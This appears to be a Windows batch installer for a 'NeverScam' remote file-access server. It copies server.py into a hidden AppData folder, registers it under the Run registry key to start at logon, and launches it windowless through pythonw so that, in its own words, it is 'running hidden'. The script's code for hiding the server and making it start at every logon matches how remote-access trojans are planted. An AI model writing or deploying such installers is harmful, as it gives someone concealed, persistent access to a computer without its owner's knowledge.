@echo off
REM NeverScam Remote File Access - Host Setup
REM This script installs the server to run hidden in the background

echo Installing NeverScam Server...

REM Create hidden directory in AppData
if not exist "%APPDATA%\NeverScam" mkdir "%APPDATA%\NeverScam"
attrib +h "%APPDATA%\NeverScam"

REM Copy server script to hidden location
copy "%~dp0server.py" "%APPDATA%\NeverScam\server.py" /Y

REM Add to startup registry (using pythonw.exe for hidden execution)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NeverScamServer /t REG_SZ /d "pythonw.exe \"%APPDATA%\NeverScam\server.py\"" /f

REM Run the server hidden immediately
start /B pythonw.exe "%APPDATA%\NeverScam\server.py"

echo Installation complete. Server is now running hidden.
timeout /t 2 >nul
exit /b 0

